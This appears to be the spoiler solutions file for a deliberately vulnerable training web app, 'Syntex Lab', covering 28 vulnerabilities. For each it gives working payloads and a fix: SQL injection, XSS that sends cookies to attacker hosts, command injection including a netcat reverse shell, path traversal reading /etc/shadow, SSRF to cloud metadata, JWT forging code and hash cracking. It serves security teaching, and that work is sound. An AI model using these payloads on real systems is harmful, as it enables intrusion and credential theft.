# SOLUTIONS.md — Syntex Lab Exploitation Writeups

> ⚠️ **SPOILERS AHEAD** — Only read after attempting each vulnerability yourself.
> This file is intentionally excluded from the main README.

---

## 1. SQL Injection — Login Bypass
**File:** `routes/auth.js` | **Endpoint:** `POST /login`

**Vulnerable code:**
```js
const query = `SELECT * FROM users WHERE username = '${username}' AND password_hash = '${hashedPassword}'`;
```

**Exploit:**
```
username: admin'--
password: anything
```
The `'--` closes the string and comments out the password check. You're logged in as admin.

**UNION dump all users:**
```
username: ' UNION SELECT 1,'hacked','hacked@x.com','0192023a7bbd73250516f069df18b500','admin','System','Admin','IT','Admin',null,null,null,null,true,null,NOW(),NOW(),NOW()--
```

**Fix:** Use parameterized queries: `db.query('SELECT * FROM users WHERE username=$1 AND password_hash=$2', [username, hash])`

---

## 2. SQL Injection — Search
**File:** `routes/search.js` | **Endpoint:** `GET /search?q=`

**Exploit — UNION to dump users:**
```
/search?q=' UNION SELECT 'user',id,username,password_hash,email FROM users--
```

**Exploit — time-based blind:**
```
/search?q='; SELECT pg_sleep(5)--
```

**Tool:** `sqlmap -u 'http://localhost:3000/search?q=test' -p q --dbs --batch`

**Fix:** Parameterized LIKE: `db.query("SELECT * FROM products WHERE name ILIKE $1", ['%'+q+'%'])`

---

## 3. SQL Injection — Products Filter (ORDER BY injection)
**File:** `routes/products.js` | **Endpoint:** `GET /products?sort=`

**Exploit:** ORDER BY injection — cannot be parameterized, must use allowlist.
```
/products?sort=(SELECT CASE WHEN (1=1) THEN price ELSE name END)
/products?sort=price; SELECT pg_sleep(3)--
```
Also injectable via `?category=` parameter.

**Fix:** Use strict allowlist: `const allowed = {price_asc:'price ASC', ...}; if(!allowed[sort]) throw error;`

---

## 4. Reflected XSS — Search
**File:** `views/search-results.ejs` | **Endpoint:** `GET /search?q=`

**Vulnerable code:** `<%- query %>` (unescaped output)

**Exploit:**
```
/search?q=<script>alert(document.cookie)</script>
/search?q=<img src=x onerror=alert(1)>
/search?q=<svg onload=fetch('http://attacker.com/?c='+document.cookie)>
```

**Tool:** `dalfox url 'http://localhost:3000/search?q=test'`

**Fix:** Change `<%- query %>` to `<%= query %>` in the template.

---

## 5. Stored XSS — Blog Comments
**File:** `views/post-detail.ejs` | **Endpoint:** `POST /blog/:id/comment`

**Vulnerable code:** `<div class="comment-body"><%- c.content %></div>`

**Exploit:**
Post a comment with:
```html
<script>document.location='http://ATTACKER/?c='+document.cookie</script>
```
Every user who views the post will execute your script. Admin cookie is httpOnly=false, so it's stealable.

**Cookie theft payload:**
```html
<img src=x onerror="fetch('http://ATTACKER/steal?cookie='+encodeURIComponent(document.cookie))">
```

**Fix:** Change `<%- c.content %>` to `<%= c.content %>` OR sanitize with DOMPurify server-side.

---

## 6. DOM XSS — URL Parameters
**File:** `public/js/app.js`

**Vulnerable code:**
```js
document.getElementById('flash-message').innerHTML = decodeURIComponent(msg);
```

**Exploit:**
```
http://localhost:3000/dashboard?message=<img src=x onerror=alert(document.cookie)>
http://localhost:3000/dashboard#<script>alert(1)</script>
```

**Fix:** Use `textContent` instead of `innerHTML`, or sanitize with DOMPurify.

---

## 7. IDOR — Profile (User Data + API Keys)
**File:** `routes/profile.js` | **Endpoint:** `GET /profile/:id`

**Exploit:**
```
Logged in as bob (id=5), navigate to:
/profile/1   → admin: api_key + FLAG in secret_note
/profile/6   → developer: DB creds in secret_note
/profile/2   → john.doe: FLAG{idor_profile_accessed_user2}
```

**API IDOR (no auth needed):**
```bash
curl http://localhost:3000/api/v1/users/1
# Returns: api_key, secret_note (FLAG), password_hash
```

**Fix:** Check ownership: `if (req.session.userId !== parseInt(id) && req.session.role !== 'admin') return 403`

---

## 8. IDOR — Orders
**File:** `routes/orders.js` | **Endpoint:** `GET /orders/:id`

**Exploit:**
```
Logged in as alice (id=4), navigate to:
/orders/6   → developer order — notes contain FLAG{idor_order_accessed_user2}
/orders/1   → john.doe's order — shows name, email, phone, address, license key
```

**Fix:** Add ownership check: `WHERE o.id = $1 AND o.user_id = $2`

---

## 9. IDOR — Tickets (Internal Notes)
**File:** `routes/tickets.js` | **Endpoint:** `GET /tickets/:id`

**Exploit:**
```
/tickets/3  → internal_notes: "FLAG{idor_ticket_internal_notes_accessed}"
/tickets/1  → internal_notes: "Known issue with CSV parser... JIRA SYN-4821"
/tickets/5  → billing notes with volume discount details
```

**Fix:** `WHERE t.id = $1 AND t.user_id = $2`; staff notes need separate role check.

---

## 10. CSRF — Profile Update
**File:** `routes/profile.js` | **Endpoint:** `POST /profile/:id/edit`

No CSRF token + IDOR = any site can update any user's profile.

**PoC HTML (host on attacker.com):**
```html
<form action="http://localhost:3000/profile/1/edit" method="POST">
  <input name="first_name" value="Hacked">
  <input name="bio" value='<script>alert(document.cookie)</script>'>
</form>
<script>document.forms[0].submit()</script>
```
Victim visits attacker.com → admin bio is changed to stored XSS payload.

**Fix:** Implement CSRF tokens (e.g. `csurf` middleware); validate `Origin`/`Referer` headers.

---

## 11. CSRF — Password Change (No Old Password)
**File:** `routes/profile.js` | **Endpoint:** `POST /profile/:id/change-password`

**Exploit:**
```html
<form action="http://localhost:3000/profile/2/change-password" method="POST">
  <input name="new_password" value="hacked123">
</form>
<script>document.forms[0].submit()</script>
```
Changes john.doe's password without knowing the current password.

**Fix:** Require old password; add CSRF token.

---

## 12. Auth Bypass — Admin Cookie
**File:** `middleware/auth.js` — `requireAdmin` function

**Exploit:**
```bash
# In browser console:
document.cookie = "role=admin; path=/"
# Then navigate to /admin

# Via curl:
curl http://localhost:3000/admin -H "Cookie: role=admin; SYNTEX_SESS=any"
```

**Fix:** Store role only server-side in session; never trust client-supplied role cookie.

---

## 13. JWT Flaw — Algorithm Confusion (alg:none)
**File:** `middleware/auth.js` — `verifyJWT` function

**Exploit:**
The `_debug_token` in `/js/config.js` is a pre-built alg:none admin token. Use it directly:
```bash
curl http://localhost:3000/api/v1/users/me \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5Ac3ludGV4LmxvY2FsIn0.'
```

**Craft any role:**
```python
import base64, json
def b64url(s): return base64.b64encode(json.dumps(s).encode()).rstrip(b'=').decode()
h = b64url({"alg":"none","typ":"JWT"})
p = b64url({"id":1,"username":"admin","role":"admin","email":"admin@syntex.local"})
print(f"{h}.{p}.")
```

**Fix:** `jwt.verify(token, secret, {algorithms: ['HS256']})` — never allow `none`.

---

## 14. JWT Flaw — Weak Secret
**File:** `middleware/auth.js` — secret is `secret123`

**Exploit:**
```bash
# Crack with jwt_tool
python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Once cracked, forge any payload:
python3 jwt_tool.py $TOKEN -T -S hs256 -p "secret123"
# Change role to admin in the editor
```

**Fix:** Use a strong random secret: `openssl rand -hex 64`

---

## 15. File Upload Bypass
**File:** `routes/upload.js`

**Vulnerable code:**
```js
const ext = path.extname(file.originalname).toLowerCase(); // → '.jpg'
if (allowedExts.includes(ext)) cb(null, true);
```

**Bypass 1 — Double extension:**
```
Rename: webshell.php → webshell.php.jpg
extname('webshell.php.jpg') === '.jpg' ✓ passes check
```

**Bypass 2 — Content-Type spoofing:**
```
Change Content-Type to image/jpeg in Burp — body is still PHP
```

**Note:** Node.js won't execute PHP. The vulnerability pattern is demonstrated. In Apache/PHP stacks this would be RCE.

**Bypass 3 — Path traversal in filename:**
```
Upload file named: ../../../var/www/html/shell.js
Stored at: uploads/../../../var/www/html/shell.js
```

**Fix:** Check MIME type against magic bytes; sanitize filename completely; store outside web root.

---

## 16. Path Traversal / LFI
**File:** `routes/upload.js` | **Endpoint:** `GET /download?file=`

**Exploit:**
```
/download?file=../../etc/passwd
/download?file=../../etc/shadow
/download?file=../../../proc/self/environ
/download?file=../server.js          ← read app source
/download?file=../database/db.js     ← read DB credentials
```

**Fix:** Validate path stays within UPLOAD_DIR:
```js
const resolved = path.resolve(UPLOAD_DIR, file);
if (!resolved.startsWith(UPLOAD_DIR)) return res.status(403).send('Forbidden');
```

---

## 17. Command Injection — Contact Form
**File:** `routes/contact.js`

**Vulnerable code:**
```js
const logCmd = `echo "[$(date)] Contact from: ${name}" >> /tmp/contact_log.txt`;
exec(logCmd, ...);
```

**Exploit (in the Name field):**
```
test; id
test; cat /etc/passwd
test && curl http://ATTACKER/$(whoami)
test; ls -la /
test | nc ATTACKER 4444 -e /bin/sh
```

**Fix:** Never use user input in shell commands. Use `execFile()` with argument array, or write to file directly via Node.js `fs`.

---

## 18. Command Injection — Admin Ping
**File:** `routes/admin.js` | **Endpoint:** `POST /admin/ping`

**Exploit (requires role=admin cookie):**
```bash
curl -X POST http://localhost:3000/admin/ping \
  -H 'Content-Type: application/json' \
  -H 'Cookie: role=admin' \
  -d '{"host":"127.0.0.1; id"}'

# More impactful:
{"host":"127.0.0.1 && cat /etc/passwd"}
{"host":"127.0.0.1; ls -la /app"}
{"host":"127.0.0.1; env"}
```

**Fix:** Validate host is a valid IP/hostname using regex; use `execFile('ping', ['-c','2', host])` not `exec()`.

---

## 19. SSRF — URL Fetch
**File:** `routes/api/v1.js` | **Endpoint:** `POST /api/v1/fetch`

**Exploit:**
```bash
# Probe internal Docker network
curl -X POST http://localhost:3000/api/v1/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://db:5432"}'

# Read internal config
curl -X POST http://localhost:3000/api/v1/fetch \
  -d '{"url":"http://localhost:3000/debug"}'

# AWS metadata (if on EC2/ECS)
curl -X POST http://localhost:3000/api/v1/fetch \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Cloud Run/GCP
curl -X POST http://localhost:3000/api/v1/fetch \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/"}'
```

**Fix:** Implement URL allowlist; block private IP ranges (RFC 1918, 169.254.x.x); use DNS rebinding protections.

---

## 20. CORS Misconfiguration
**File:** `middleware/cors.js`

**Vulnerable code:**
```js
const origin = req.headers.origin;
res.setHeader('Access-Control-Allow-Origin', origin);   // reflects any origin
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

**PoC (host on attacker.com):**
```html
<script>
fetch('http://localhost:3000/api/v1/users/me', {credentials:'include'})
  .then(r=>r.json())
  .then(d=>fetch('http://attacker.com/steal?data='+JSON.stringify(d)));
</script>
```

**Fix:** Use strict origin allowlist: `const allowed = ['https://syntex.local']; if(allowed.includes(origin)) res.setHeader(...)`

---

## 21. Open Redirect
**File:** `routes/auth.js` | **Endpoint:** `GET /login?redirect=`

**Exploit:**
```
http://localhost:3000/login?redirect=https://evil.com
http://localhost:3000/logout?redirect=https://evil.com
http://localhost:3000/go?url=https://evil.com
```
Phishing use-case: send victim `http://syntex.local/login?redirect=http://evil-syntex.com/login` — they log in, get redirected to a fake page that harvests re-entered credentials.

**Fix:** Validate redirect is a relative path: `if(!redirect.startsWith('/') || redirect.startsWith('//')) redirect = '/dashboard'`

---

## 22. Exposed Secrets
All accessible without authentication:

| Path | Contents |
|------|----------|
| `GET /.env` | DB password, JWT secret, AWS keys, Stripe key |
| `GET /.git/config` | Git remote URL with embedded GitHub token |
| `GET /backup.sql` | DB dump with MD5 password hashes |
| `GET /debug` | All `process.env` variables |
| `GET /config.json` | JWT secret, internal API key |
| `GET /web.config` | DB connection string, JWT secret |
| `GET /js/config.js` | API keys, Stripe, debug JWT token (alg:none) |
| `GET /js/internal.js` | Internal routes, service tokens |
| `GET /api/v2/internal/config` | Full config JSON (no auth) |
| `GET /api/v2/users/export` | All users including MD5 hashes (no auth) |
| `GET /api/v1/debug/env` | All env vars via API |

**Fix:** Never serve sensitive files via static middleware; remove debug endpoints before production; rotate all exposed credentials.

---

## 23. Business Logic — Negative Quantity
**File:** `routes/orders.js` | **Endpoint:** `POST /orders`

**Exploit:**
```bash
curl -X POST http://localhost:3000/orders \
  -H 'Cookie: SYNTEX_SESS=YOUR_SESSION' \
  -d 'product_id=1&quantity=-100&unit_price=299&shipping_address=test'
# total_price = 299 * -100 = -29,900 (credit)
```

Also: send `unit_price=0.01` to override the DB price.

**Fix:** Validate `quantity > 0`; always use server-side price from DB, never trust client.

---

## 24. Business Logic — Coupon Reuse
**File:** `routes/orders.js` | **Endpoint:** `POST /orders/apply-coupon`

No check that the current user has already applied this coupon.

**Exploit:** Call the endpoint repeatedly with the same `code` + `order_id`:
```bash
for i in $(seq 1 10); do
  curl -X POST http://localhost:3000/orders/apply-coupon \
    -H 'Content-Type: application/json' \
    -H 'Cookie: SYNTEX_SESS=YOUR_SESSION' \
    -d '{"code":"VIP50","order_id":1}'
done
# After enough calls, total_price goes negative
```

**Fix:** Insert into `coupon_uses` and check before applying: `SELECT * FROM coupon_uses WHERE coupon_id=$1 AND user_id=$2`

---

## 25. Broken Access Control — Mass User Export
**File:** `routes/api/v2.js` | **Endpoint:** `GET /api/v2/users/export`

No authentication required at all.

**Exploit:**
```bash
# Get all users with MD5 hashes (crack with hashcat)
curl http://localhost:3000/api/v2/users/export
curl 'http://localhost:3000/api/v2/users/export?format=csv'

# Crack MD5 hashes (all are in rockyou.txt)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Fix:** Add `requireAuth` and `requireAdmin` middleware to all `/api/v2/internal/` routes.

---

## 26. Weak Password Hashing (MD5)
**File:** `database/seed.js`, `routes/auth.js`

**Exploit:** Dump hashes via `/api/v2/users/export`, then crack with hashcat:
```bash
# Extract hashes
curl http://localhost:3000/api/v2/users/export | jq -r '.[].password_hash' > hashes.txt

# Crack (MD5 = mode 0)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --show

# All seed passwords are in rockyou.txt:
# admin123, Password1!, letmein123, alice2024, 123456789, devpass2024, support123
```

**Fix:** Use bcrypt (cost 12+) or Argon2id. Never use MD5/SHA1 for passwords.

---

## 27. Rate Limit Bypass
**File:** `middleware/auth.js` — `rateLimit` function

The rate limiter trusts `X-Forwarded-For` header, which is client-controlled.

**Exploit:**
```bash
# Brute force login — rotate X-Forwarded-For to bypass per-IP limit
for i in $(seq 1 1000); do
  curl -s -X POST http://localhost:3000/login \
    -H "X-Forwarded-For: 1.2.3.$((i % 256))" \
    -d "username=admin&password=password$i" | grep -i "dashboard\|error"
done
```

**Fix:** Rate limit by session/user ID server-side, not by IP; don't trust `X-Forwarded-For` unless behind a trusted proxy; use Redis-backed rate limiting.

---

## 28. Missing Security Headers
**How to check:**
```bash
curl -I http://localhost:3000/ | grep -iE '(content-security|x-frame|x-content-type|strict-transport|referrer)'
# None of these headers are present
```

**Missing:** `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, `Permissions-Policy`

**Fix:**
```js
app.use(require('helmet')());
```
Or set manually in Express middleware.

---

## Summary Quick Reference

| Vuln | Endpoint | Payload/Method |
|------|----------|----------------|
| SQLi login | POST /login | `username: admin'--` |
| SQLi search | GET /search?q= | `' UNION SELECT...--` |
| XSS reflected | GET /search?q= | `<script>alert(1)</script>` |
| XSS stored | POST /blog/:id/comment | `<script>alert(document.cookie)</script>` |
| DOM XSS | GET /?message= | `<img src=x onerror=alert(1)>` |
| IDOR profile | GET /profile/1 | Change ID to 1 |
| IDOR order | GET /orders/6 | Change ID to 6 |
| CSRF | POST /profile/:id/edit | No token needed |
| Admin bypass | GET /admin | Cookie: role=admin |
| JWT none | Any JWT endpoint | Use alg:none token from /js/config.js |
| SSRF | POST /api/v1/fetch | `{"url":"http://db:5432"}` |
| Cmd injection | POST /contact | `name: test; id` |
| Path traversal | GET /download?file= | `../../etc/passwd` |
| Open redirect | GET /login?redirect= | `https://evil.com` |
| Exposed .env | GET /.env | Direct access |
| User export | GET /api/v2/users/export | No auth needed |
